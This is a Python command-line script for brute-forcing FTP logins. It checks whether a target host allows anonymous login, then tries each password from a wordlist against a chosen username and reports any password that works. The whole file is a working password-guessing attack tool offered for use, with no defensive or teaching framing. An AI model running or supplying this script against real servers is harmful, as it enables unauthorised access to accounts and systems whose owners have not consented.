import ftplib
import sys
import argparse

def anonCheck(host):
    try:
        ftp = ftplib.FTP(host) 
        ftp.login('anonymous')
        print('Anonymous login successful')
        ftp.quit()
        return True
    except Exception:
        print('Failed to login')
        return False

def tryLogin(user, host, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user, password)
        print('Login successful with', password)
        ftp.quit()
        sys.exit()
    except Exception:
        pass

def bruteForce(host, user, passwordList):
    passwordList = open(passwordList, 'r')
    passwords = passwordList.readlines()
    for password in passwords:
        password = password.strip()
        tryLogin(user, host, password)

parser = argparse.ArgumentParser(description = 'FTP Brute Force')
parser.add_argument('-t', '--target', help='Hostname or IP', required=True)
parser.add_argument('-u', '--username', help='FTP Username to brute force', required=True)
parser.add_argument('-w', '--paswordlist', help='Pasword list Path', default='./passwords.txt')

args = parser.parse_args()

host = args.target
username = args.username
paswordlist = args.paswordlist
anonCheck(host)
bruteForce(host, username, paswordlist)